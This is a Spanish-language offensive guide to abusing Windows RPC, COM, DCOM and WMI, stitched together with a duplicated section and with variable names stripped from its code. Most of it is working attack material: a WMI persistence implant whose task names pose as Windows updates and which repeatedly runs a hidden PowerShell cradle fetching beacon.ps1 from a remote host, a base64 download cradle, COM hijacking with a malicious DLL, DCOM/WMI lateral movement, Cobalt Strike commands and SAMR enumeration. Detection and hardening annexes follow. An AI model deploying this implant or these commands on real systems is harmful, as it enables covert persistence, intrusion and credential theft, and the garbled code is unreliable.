## 9.5 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Persistence Implant

### Objetivo:
Establecer [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en un sistema via WMI event subscriptions.

### Diseño del implant:
- Timer que se dispara cada 5 minutos
- Ejecuta un [payload](../raw/m3t4spl01t.md#payloads) que descarga y ejecuta un script de [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)
- Se almacena en el repository WMI (no deja archivos)
- Sobrevive a reinicios

### Implementacion:

function Deploy-WmiImplant {
    param(
        [string] = "localhost",
        [PSCredential] = ,
        [string] = "[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://192.168.1.50/beacon.ps1"
    )
    
     = "MS_Windows_Update_Sync_v4"
     = "MS_Windows_HealthCheck_v4"
     = "MS_Windows_HealthExec_v4"
     = "powershell.exe -NoP -W Hidden -Exec Bypass -C "Invoke-Expression (New-Object Net.WebClient).DownloadString('')""
    
     = @{
        Namespace = "root\subscription"
        Class = "__EventFilter"
        Arguments = @{
            Name = 
            Query = "SELECT * FROM __TimerEvent WHERE TimerID = ''"
            QueryLanguage = "WQL"
            EventNamespace = "root\cimv2"
        }
    }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-WmiInstance @params | Out-Null
    
    .Class = "CommandLineEventConsumer"
    .Arguments = @{
        Name = 
        CommandLineTemplate = 
    }
    Set-WmiInstance @params | Out-Null
    
    .Class = "__FilterToConsumerBinding"
    .Arguments = @{
        Filter = "__EventFilter.Name=''"
        Consumer = "CommandLineEventConsumer.Name=''"
    }
    Set-WmiInstance @params | Out-Null
    
     = @{
        Namespace = "root\cimv2"
        Class = "__TimerInstruction"
        Arguments = @{
            TimerId = 
            IntervalBetweenEvents = 300000  # 5 min
            SkipIfPassed = False
        }
    }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    Set-WmiInstance @timerParams | Out-Null
    
    Write-Host "[+] WMI implant deployed. Payload: "
}

function Remove-WmiImplant {
    param([string] = "localhost", [PSCredential] = )
    
     = "MS_Windows_HealthCheck_v4"
     = "MS_Windows_HealthExec_v4"
     = "MS_Windows_Update_Sync_v4"
    
     = @{ Namespace="root\subscription"; Class="__EventFilter"; Filter="Name=''" }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    Get-WmiObject @params | Remove-WmiObject -ErrorAction SilentlyContinue
    
    .Class = "CommandLineEventConsumer"
    .Filter = "Name=''"
    Get-WmiObject @params | Remove-WmiObject -ErrorAction SilentlyContinue
    
     = @{ Namespace="root\cimv2"; Class="__TimerInstruction"; Filter="TimerId=''" }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    Get-WmiObject @timerParams | Remove-WmiObject -ErrorAction SilentlyContinue
    
    Write-Host "[-] WMI implant removed."
}

### Deteccion del implant:
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Format-List Name, Query
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Format-List Name, CommandLineTemplate
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Format-List *

### Logs forenses:
- Event ID 5861 (WMI consumer creation)
- Event ID 5862 (WMI consumer deletion)
- Event ID 5859 (WMI filter creation)

---

# FIN

> Recorda: Esto es solo para fines educativos y auditorias autorizadas. No seas gil, no uses esto en sistemas que no te pertenecen.
> 
> Si te quedo alguna duda, abri el [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark), fijate como viaja un paquete [rpc](../raw/w1n-s9bsyst3ms.md#rpc), y ahi te vas a dar cuenta de todo.

# Herramientas

## 8.1 Impacket

Instalacion: pip install impacket

### [rpc](../raw/w1n-s9bsyst3ms.md#rpc) Tools:
| Tool | Uso |
|------|-----|
| rpcdump.py | Enumerar interfaces RPC |
| samrdump.py | Enumerar SAM via RPC |
| lookupsid.py | Enumerar SIDs via lsarpc |
| secretsdump.py | Dumpear hashes (DSync) |
| netview.py | Ver sesiones/shares |

### [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Tools:
| Tool | Uso |
|------|-----|
| dcomexec.py | Ejecucion via DCOM |
| dcompermissions.py | Enumerar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) DCOM |

### [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Tools:
| Tool | Uso |
|------|-----|
| wmiexec.py | Shell semi-interactiva via WMI |
| wmipersist.py | WMI persistence |

### Auxiliares:
getTGT.py, getST.py, ticketer.py, smbexec.py, atexec.py, reg.py

---

## 8.2 OleView .NET

Parte de Windows SDK. GUI para examinar [com](../raw/w1n-s9bsyst3ms.md#com).
- Navegar CLSIDs, Interfaces, AppIDs, TypeLibs
- Ver [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) [dcom](../raw/w1n-s9bsyst3ms.md#dcom)
- Conectar a remotos
- Probar creacion de objetos

Ubicacion tipica: %ProgramFiles([x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86))%\Windows Kits\10\bin\10.0.xxxxx.0\[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)\OleViewDotNet.exe

Uso ofensivo:
1. View -> Group by CLSID
2. Buscar CLSIDs con permisos debiles
3. Right-click -> Create Instance on Remote...

---

## 8.3 RPCView

GUI para ver interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc).
GitHub: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/silverf0x/RpcView

Muestra: interfaces, endpoints, metodos, PID, [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).

Uso: File -> Connect to remote -> [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) -> Export.

---

## 8.4 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Explorer / wbemtest

### wbemtest:
Viene con Windows. Win+R -> wbemtest
- Conectar a namespace (root\cimv2)
- Ejecutar WQL
- Llamar metodos

Conexion remota: \\192.168.1.100\root\cimv2

### WMI Explorer (SAPIEN):
Herramienta externa. Muestra namespaces, clases, propiedades, metodos.

---

## 8.5 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) para [rpc](../raw/w1n-s9bsyst3ms.md#rpc)/[com](../raw/w1n-s9bsyst3ms.md#com)/[wmi](../raw/w1n-s9bsyst3ms.md#wmi)

### Named pipes RPC:
 = New-Object System.IO.Pipes.NamedPipeClientStream("192.168.1.100", "samr", [System.IO.Pipes.PipeDirection]::InOut)
.Connect(3000)

### COM desde PowerShell:
 = New-Object -ComObject WScript.Shell
.Run("calc.exe", 0)

 = New-Object -ComObject InternetExplorer.Application
.Visible = False
.Navigate("[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://malware.com")

### WMI desde PowerShell:
Get-WmiObject -Class Win32_Process
Get-CimInstance -ClassName Win32_Process
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
Register-CimIndicationEvent -ClassName __InstanceCreationEvent -SourceIdentifier ProcMon

### [dcom](../raw/w1n-s9bsyst3ms.md#dcom) desde PowerShell:
[activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "192.168.1.100"))

### [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) COM con VBScript:
[set](../raw/ph1sh1ng.md#social-engineering-toolkit) objShell = CreateObject("WScript.Shell")
objShell.Run "calc.exe", 0, False

---

## 8.6 [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike)

### Comandos relacionados:
| Comando | Que hace |
|---------|----------|
| execute-[assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) SharpLateral.exe [dcom](../raw/w1n-s9bsyst3ms.md#dcom) <target> <exe> | DCOM lateral movement |
| jump dcom <target> <listener> | DCOM jump via MMC |
| jump [wmi](../raw/w1n-s9bsyst3ms.md#wmi) <target> <listener> | WMI jump |
| powerpick Get-WmiObject ... | Ejecutar WMI en contexto beacon |
| wmi <target> <command> | WMI execution |
| dcom <target> <command> | DCOM execution |

---

## 8.7 Otras herramientas piolas

| Herramienta | Que hace |
|-------------|----------|
| SharpLateral | [dcom](../raw/w1n-s9bsyst3ms.md#dcom)/[wmi](../raw/w1n-s9bsyst3ms.md#wmi)/[smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) lateral movement en C# |
| WMIOps | Scripts de [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) para WMI ofensivo |
| WMI_Persistence | Modulo de PowerShell para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) WMI |
| COMProxy | Tool para [com](../raw/w1n-s9bsyst3ms.md#com) hijacking |
| MSFVenom + [meterpreter](../raw/m3t4spl01t.md#meterpreter) | Modulos: [exploit](../raw/m3t4spl01t.md#exploits)/windows/local/xxx (COM hijack) |
| PowerSploit | Module: Invoke-DCOM, Invoke-WMI |
| Sysinternals Autoruns | Detecta persistencia COM y WMI |
| ProcMon (Sysinternals) | Monitorear acceso a CLSIDs en registry |


# Proyectos Practicos

## 9.1 Enumeracion [rpc](../raw/w1n-s9bsyst3ms.md#rpc) remota con [python](../raw/pyth0n-f0r-h4ck1ng.md)

from impacket.dcerpc.v5 import transport, samr, lsarpc, srvsvc

TARGET = "192.168.1.100"
USER = "DOMAIN\\user"
PASS = "password"

def enum_samr():
    binding = f"ncacn_np:{TARGET}[\\pipe\\samr]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    rpc_transport.connect()
    dce = rpc_transport.DCERPC_class(rpc_transport)
    dce.bind(samr.MSRPC_UUID_SAMR)
    
    resp = samr.hSamrConnect(dce)
    handle = resp['ServerHandle']
    resp = samr.hSamrEnumerateDomainsInSamServer(dce, handle)
    for domain in resp['Buffer']['Buffer']:
        print(f"[*] Domain: {domain['Name']}")
        
        dom_resp = samr.hSamrOpenDomain(dce, handle, 0x200, domain['Sid'])
        dom_handle = dom_resp['DomainHandle']
        
        enum_resp = samr.hSamrEnumerateUsersInDomain(dce, dom_handle, 0, 0x100)
        for user in enum_resp['Buffer']['Buffer']:
            print(f"    User: {user['Name']}")

def enum_lsarpc():
    binding = f"ncacn_np:{TARGET}[\\pipe\\lsarpc]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    rpc_transport.connect()
    dce = rpc_transport.DCERPC_class(rpc_transport)
    dce.bind(lsarpc.MSRPC_UUID_LSARPC)
    
    resp = lsarpc.hLsarOpenPolicy2(dce, f"\\\\{TARGET}", 0x800)
    policy_handle = resp['PolicyHandle']
    
    resp = lsarpc.hLsarQueryInformationPolicy2(dce, policy_handle, lsarpc.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
    print(f"[*] Domain: {resp['PolicyInfo']['DomainName']}")

if __name__ == '__main__':
    enum_samr()
    enum_lsarpc()

Este script conecta via named pipes a samr y lsarpc, enumera dominios y usuarios.

---

## 9.2 [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)

### Objetivo:
Registrar un CLSID en HKCU para que cuando una aplicacion lo intente crear, cargue nuestra DLL.

### Pasos:
1. Identificar un CLSID que una aplicacion intenta crear pero no existe.
   - Usar ProcMon: Filter -> RegOpenKey -> Path contains CLSID -> Result is NAME NOT FOUND
2. Crear la DLL maliciosa (beacon.dll, [meterpreter](../raw/m3t4spl01t.md#meterpreter).dll, etc.)
3. Registrar el CLSID:
    = "{CLSID-FAKE}"
   New-Item -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Force
   [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-ItemProperty -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" ^
       -Name "(Default)" -Value "C:\path\to\beacon.dll"
   Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" ^
       -Name "ThreadingModel" -Value "Apartment"
4. Esperar a que el usuario ejecute la aplicacion que referencia el CLSID.
5. La DLL se carga en el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de la aplicacion.

### CLSIDs conocidos para hijacking:
- {D9144DCD-E998-4ECA-AB6A-DCD83CC58416}: Windows [cloud](../raw/cl0ud-h4ck1ng.md) Store
- {9C073F21-15B4-49B2-9E4B-35C81D4E27E6}: Xbox Live
- Muchos CLSIDs de Microsoft Office

### Deteccion:
- Sysinternals Autoruns -> COM tab
- Get-ChildItem "HKCU:\Software\Classes\CLSID"
- Monitorear procesos que cargan DLLs desde paths de usuario

---

## 9.3 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Lateral Movement a un equipo remoto

### Objetivo:
Ejecutar un comando en una maquina remota usando DCOM (MMC20.Application).

### Requisitos:
- Credenciales validas (administrador local del remoto)
- [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135 + [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) dinamico accesible
- Remote Service Management habilitado en [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls)
- LocalAccountTokenFilterPolicy = 1 (para cuentas locales)

### Paso a paso:

1. Verificar conectividad:
Test-NetConnection 192.168.1.100 -Port 135

2. Probar [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion):
dir \\192.168.1.100\C$

3. Ejecutar DCOM MMC:
 = "192.168.1.100"

 = [activator]::CreateInstance(
    [type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", )
)
.Document.ActiveView.ExecuteShellCommand(
    "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe", ,
    "-NoP -W Hidden -Exec Bypass -C "Start-Process calc.exe"",
    "7"
)

4. Verificar que el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) corra en el remoto:
Get-WmiObject -ComputerName  -Class Win32_Process -Filter "Name='calc.exe'"

5. Si falla, checkear:
- Firewall: Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
- Registry: LocalAccountTokenFilterPolicy = 1

### Usando Impacket:
impacket-dcomexec DOMAIN/user:password@192.168.1.100

### Usando [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike):
jump dcom 192.168.1.100 beacon

---

## 9.4 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Remote Process Creation

### Objetivo:
Crear un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) en una maquina remota usando WMI y recuperar el output.

### Paso a paso:

1. Verificar WMI disponible:
Test-WSMan 192.168.1.100
Get-WmiObject -List -ComputerName 192.168.1.100 | Where-Object { .Name -eq "Win32_Process" }

2. Crear proceso:
 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_Process
 = .Create("cmd.exe /c whoami > C:\Windows\Temp\output.txt 2>&1")

3. Leer output:
Get-Content "\\192.168.1.100\C$\Windows\Temp\output.txt"

4. Proceso mas complejo con [payload](../raw/m3t4spl01t.md#payloads) en base64:
 = .Create("cmd.exe /c [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe -NoP -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBhAC4AcABzADEAJwApAA==")

5. Usando Invoke-CimMethod (WinRM):
 = New-CimSession -ComputerName 192.168.1.100
Invoke-CimMethod -CimSession  -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "calc.exe"
}

6. Usando Impacket:
impacket-wmiexec DOMAIN/user:password@192.168.1.100

---

## 9.5 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Persistence Implant

### Objetivo:
Establecer [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en un sistema via WMI event subscriptions.

### Diseno del implant:
- Timer que se dispara cada 5 minutos
- Ejecuta un [payload](../raw/m3t4spl01t.md#payloads) que descarga y ejecuta un script de [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)
- Se almacena en el repository WMI (no deja archivos en disco)
- Sobrevive a reinicios

### Implementacion:

function Deploy-WmiImplant {
    param(
        [string] = "localhost",
        [PSCredential] = ,
        [string] = "[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://192.168.1.50/beacon.ps1"
    )
    
     = "MS_Windows_Update_Sync_v4"
     = "MS_Windows_HealthCheck_v4"
     = "MS_Windows_HealthExec_v4"
     = "powershell.exe -NoP -W Hidden -Exec Bypass -C "Invoke-Expression (New-Object Net.WebClient).DownloadString('')""
    
     = @{
        Namespace = "root\subscription"
        Class = "__EventFilter"
        Arguments = @{
            Name = 
            Query = "SELECT * FROM __TimerEvent WHERE TimerID = ''"
            QueryLanguage = "WQL"
            EventNamespace = "root\cimv2"
        }
    }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-WmiInstance @params | Out-Null
    
    .Class = "CommandLineEventConsumer"
    .Arguments = @{
        Name = 
        CommandLineTemplate = 
    }
    Set-WmiInstance @params | Out-Null
    
    .Class = "__FilterToConsumerBinding"
    .Arguments = @{
        Filter = "__EventFilter.Name=''"
        Consumer = "CommandLineEventConsumer.Name=''"
    }
    Set-WmiInstance @params | Out-Null
    
     = @{
        Namespace = "root\cimv2"
        Class = "__TimerInstruction"
        Arguments = @{
            TimerId = 
            IntervalBetweenEvents = 300000  # 5 min
            SkipIfPassed = False
        }
    }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    Set-WmiInstance @timerParams | Out-Null
    
    Write-Host "[+] WMI implant deployed. Payload: "
}

function Remove-WmiImplant {
    param([string] = "localhost", [PSCredential] = )
    
     = "MS_Windows_HealthCheck_v4"
     = "MS_Windows_HealthExec_v4"
     = "MS_Windows_Update_Sync_v4"
    
     = @{ Namespace="root\subscription"; Class="__EventFilter"; Filter="Name=''" }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    Get-WmiObject @params | Remove-WmiObject -ErrorAction SilentlyContinue
    
    .Class = "CommandLineEventConsumer"
    .Filter = "Name=''"
    Get-WmiObject @params | Remove-WmiObject -ErrorAction SilentlyContinue
    
     = @{ Namespace="root\cimv2"; Class="__TimerInstruction"; Filter="TimerId=''" }
    if ( -ne "localhost") { .ComputerName = ; .Credential =  }
    Get-WmiObject @timerParams | Remove-WmiObject -ErrorAction SilentlyContinue
    
    Write-Host "[-] WMI implant removed."
}

### Deteccion del implant:
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Format-List Name, Query
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Format-List Name, CommandLineTemplate
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Format-List *

### Logs forenses:
- Event ID 5861 (WMI consumer creation)
- Event ID 5862 (WMI consumer deletion)
- Event ID 5859 (WMI filter creation)

---

# FIN

> Recorda: Esto es solo para fines educativos y auditorias autorizadas. No seas gil, no uses esto en sistemas que no te pertenecen.
> 
> Si te quedo alguna duda, abri el [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark), fijate como viaja un paquete [rpc](../raw/w1n-s9bsyst3ms.md#rpc), y ahi te vas a dar cuenta de todo.

## Anexo A: Referencia rapida de UUIDs de interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc)

| UUID | Nombre | Pipe/[puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | Uso ofensivo |
|------|--------|-------------|-------------|
| 12345678-1234-ABCD-EF00-0123456789AB | lsarpc | \\pipe\lsarpc | Politicas de seguridad, lookup de SIDs |
| 12345778-1234-ABCD-EF00-0123456789AC | samr | \\pipe\samr | Enumeracion de usuarios y grupos |
| E3514235-4B06-11D1-AB04-00C04FC2DCD2 | drsuapi | [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) dinamico | DSync, DCShadow |
| 4B324FC8-1610-4BAE-865C-D1F3E7ED4259 | srvsvc | \\pipe\srvsvc | Shares, sesiones |
| 338CD001-2244-31F1-AAAA-900038001003 | winreg | \\pipe\winreg | Registry remoto |
| 5A7B91F8-FF00-11D0-A9B2-00C04FB6E6FC | wkstn | \\pipe\wkssvc | Informacion de workstation |
| 82273FDC-E32A-18C3-3F78-827929DC23EA | eventlog | \\pipe\evtlog | Log de eventos |
| 1FF70682-0A51-30E8-076D-740BE8CEE98B | spoolss | \\pipe\spoolss | Spooler de impresion |
| 3C4728C5-F0AB-4B65-803D-ABEE1E88F2F2 | Tschats | \\pipe\atsvc | Tareas programadas |
| 3473DD4D-2E88-4324-B0E6-12B889D5E5D1 | LSA Lookup | \\pipe\lsass | Lookup de privilegios |
| 7EA70BCF-48AF-4F6A-8968-6A440754D5FA | NetLogon | \\pipe\netlogon | [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) de dominio |
| 3A9EF155-691D-4449-8B05-09AD57031823 | IRemoteWinspool | \\pipe\winspool | Impresion remota |


## Anexo B: Referencia de CLSIDs ofensivos

| CLSID | Objeto | Uso ofensivo |
|-------|--------|-------------|
| {49B2791A-B1AE-4C90-9B8E-E860BA07F889} | MMC20.Application | Lateral movement via [dcom](../raw/w1n-s9bsyst3ms.md#dcom) |
| {00024500-0000-0000-C000-000000000046} | Excel.Application | Lateral movement via DCOM |
| {C08AFD90-F2A1-11D1-8455-00A0C91F3880} | ShellWindows | Lateral movement via DCOM |
| {76A64158-CB41-11D1-8B02-00600806D9B6} | WbemLocator | Lateral movement via [wmi](../raw/w1n-s9bsyst3ms.md#wmi) |
| {3E5FC7F9-9A51-4367-9063-A120244FBEC7} | CMSTPLUA | [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) |
| {08A0E5A0-179B-11D3-8C07-0000F81D7D4D} | UAC Script Host | UAC bypass |
| {D5E65222-76F1-4B2B-84D5-A90C68C8D348} | NetAdapterConfig | UAC bypass |
| {00000315-0000-0000-C000-000000000046} | OleStr (treat as) | [com](../raw/w1n-s9bsyst3ms.md#com) hijacking target |


## Anexo C: Contra-medidas y deteccion

### Deteccion de abuso de [rpc](../raw/w1n-s9bsyst3ms.md#rpc):
- Monitorear conexiones a [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135 desde [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) no autorizadas.
- Logs de Windows: Event ID 5719 (RPC connection).
- Logs de [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls): conexiones a puertos altos (49152+).
- Analisis de trafico de [red](../raw/r3d3s-f0nd4m3nt0s.md): paquetes RPC con bind a interfaces sensibles (samr, drsuapi).

### Deteccion de [com](../raw/w1n-s9bsyst3ms.md#com) hijacking:
- Sysinternals Autoruns (pestana COM).
- Monitorear el registry HKCU\Software\Classes\CLSID.
- Event ID 5861 ([wmi](../raw/w1n-s9bsyst3ms.md#wmi) consumer creation) para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia).
- Procesos hijos inesperados bajo wmiprvse.exe o svchost.exe.

### Deteccion de [dcom](../raw/w1n-s9bsyst3ms.md#dcom) lateral movement:
- Conexiones a TCP 135 seguidas de conexiones a puertos altos.
- Procesos como mmc.exe, excel.exe, visio.exe ejecutandose sin usuario interactivo.
- Event ID 4624 (logon) con tipo 3 (network) seguido de creacion de procesos.

### Deteccion de WMI persistence:
- Event ID 5861: filtro/consumer WMI creado.
- Event ID 5862: filtro/consumer WMI eliminado.
- Sysinternals Autoruns (pestana WMI).
- Get-WmiObject queries periodicas desde el mismo host a root\subscription.

### Hardening:
- Deshabilitar RPC over [http](../raw/r3d3s-f0nd4m3nt0s.md#http) si no se usa.
- Restringir acceso a DCOM via MachineLaunchRestrictions y MachineAccessRestrictions.
- Configurar LocalAccountTokenFilterPolicy = 0 (default) para prevenir lateral movement con cuentas locales.
- Habilitar Windows Defender Firewall con reglas restrictivas.
- Monitorear y auditar cambios en HKCR\CLSID.
- Configurar SACL para auditar acceso a CLSIDs criticos.
- Usar WDAC (Windows Defender Application Control) o AppLocker.
- Deshabilitar WMI si no se usa (no recomendado, rompe muchas cosas).


## Anexo D: Glosario

| Termino | Significado |
|---------|-------------|
| **Binding Handle** | [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) opaco que representa una conexion [rpc](../raw/w1n-s9bsyst3ms.md#rpc) |
| **CLSID** | Class Identifier, GUID de 128 bits para clases [com](../raw/w1n-s9bsyst3ms.md#com) |
| **DCE/RPC** | Distributed Computing Environment / Remote Procedure Call |
| **[dcom](../raw/w1n-s9bsyst3ms.md#dcom)** | Distributed COM, COM sobre la [red](../raw/r3d3s-f0nd4m3nt0s.md) |
| **DSync** | Directory Replication, ataque para obtener hashes de [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) |
| **EPM** | Endpoint Mapper, servicio en [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135 |
| **IID** | Interface Identifier, GUID para interfaces COM/ RPC |
| **LRPC** | Local RPC, comunicacion entre procesos local |
| **Marshalling** | Serializacion de parametros para viajar entre procesos |
| **MTA** | Multi-Threaded Apartment, modelo de concurrencia COM |
| **NDR** | Network Data Representation, formato de serializacion RPC |
| **OBJREF** | Object Reference, referencia serializada a un objeto COM |
| **OID** | Object Identifier, identifica un objeto DCOM |
| **Opnum** | Operation Number, numero de operacion en una interfaz RPC |
| **ORPC** | Object RPC, RPC extendido para objetos DCOM |
| **OXID** | Object Exporter Identifier, identifica un exportador DCOM |
| **ProgID** | Programmatic Identifier, nombre legible de una clase COM |
| **Protocol Sequence** | Identificador del transporte RPC (ncacn_np, ncacn_ip_tcp, etc.) |
| **STA** | Single-Threaded Apartment, modelo de concurrencia COM |
| **WBEM** | Web-Based Enterprise Management, estandar de gestion |
| **[wmi](../raw/w1n-s9bsyst3ms.md#wmi)** | Windows Management Instrumentation |
| **WQL** | WMI Query Language, subconjunto de SQL |
| **OXID Resolver** | Servicio que resuelve OXIDs a direcciones de red |


## Anexo E: Comandos rapidos de [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)

### Enumeracion:
Get-WmiObject -Class Win32_Process | Format-Table Name, ProcessId, ExecutablePath
Get-WmiObject -Class Win32_Service | Format-Table Name, State, StartMode
Get-WmiObject -Class Win32_UserAccount | Format-Table Name, SID, Disabled
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-WmiObject -Class Win32_QuickFixEngineering | Format-Table HotFixID, InstalledOn
Get-WmiObject -Class Win32_ComputerSystem | Format-Table UserName, Domain, TotalPhysicalMemory
Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Format-Table DeviceID, Size, FreeSpace
Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
Get-WmiObject -Class Win32_StartupCommand | Format-Table Name, Command, User
Get-WmiObject -Namespace root\cimv2 -Class Win32_Environment

### Remoto:
Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_Process
Get-WmiObject -ComputerName 192.168.1.100 -Credential  -Class Win32_Service
Invoke-CimMethod -ComputerName 192.168.1.100 -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine="calc.exe" }

### [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Persistence:
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

### [com](../raw/w1n-s9bsyst3ms.md#com):
Get-ItemProperty HKLM:\Software\Classes\CLSID\* | Select-Object PSChildName, @{N="Name";E={.'(default)'}}
Get-ChildItem HKLM:\Software\Classes\CLSID\*\InprocServer32
Get-ChildItem HKLM:\Software\Classes\CLSID\*\LocalServer32
Get-ChildItem HKLM:\Software\Classes\AppID\*


## Anexo F: Troubleshooting

### [rpc](../raw/w1n-s9bsyst3ms.md#rpc) no funciona:
- Verificar que [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135 este abierto: Test-NetConnection target -Port 135
- Verificar que el servicio RpcSs este corriendo en el target.
- Verificar [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls): Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
- Probar con credenciales explicitas.
- Probar con diferentes protocol sequences (ncacn_np vs ncacn_ip_tcp).

### [dcom](../raw/w1n-s9bsyst3ms.md#dcom) falla:
- Verificar que el CLSID existe y es accesible remotamente.
- Verificar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de launch/ access en OleView .NET.
- Verificar MachineLaunchRestrictions.
- Probar con RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
- Si es Windows 10/11, verificar LocalAccountTokenFilterPolicy.

### [wmi](../raw/w1n-s9bsyst3ms.md#wmi) remoto falla:
- Verificar que el servicio Winmgmt este corriendo.
- Verificar DCOM (135 + dinamico) o WinRM (5985/5986).
- Probar wbemtest local para verificar que WMI funciona.
- Probar con Get-WmiObject -List para ver si el namespace existe.
- Verificar que el usuario tenga permisos en DCOM y WMI.

### [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking no funciona:
- Verificar que el CLSID realmente se intente crear (ProcMon).
- Verificar que el CLSID NO exista en HKLM (si existe, HKCU no tiene prioridad a menos que el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) se ejecute como el usuario).
- Verificar el ThreadingModel (si la DLL no es MTA, usar "Apartment").
- Verificar que la DLL sea de 32/64 bits correcta para el proceso target.

### Error: Access Denied en RPC samr:
- El usuario no tiene permisos en SAM.
- Probar con un usuario administrador local.
- Verificar que la maquina no sea un DC (en DCs, SAM solo se accede via [ad](../raw/w1nd0ws-d0m41n-4dm1n.md)).
- Probar con RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
- Verificar el firewall de Windows.


